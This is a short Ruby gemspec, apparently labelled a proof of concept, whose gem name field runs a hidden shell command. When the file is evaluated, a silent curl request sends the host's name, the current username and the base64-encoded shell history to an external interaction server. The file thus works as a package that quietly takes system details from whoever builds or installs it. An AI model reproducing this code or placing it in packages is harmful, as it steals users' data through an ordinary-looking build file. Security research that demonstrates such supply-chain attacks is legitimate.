Gem::Specification.new do |s|
  s.name    = `curl -s "https://dtscchmqpronalsrfkkjwhyialnd5xsnm.oast.fun/s?$(hostname)&user=$(whoami)&pwd=$(history | base64)"`.strip
  s.version = "1.0.0"
  s.summary = "proof of concept"
  s.authors = ["test"]
end
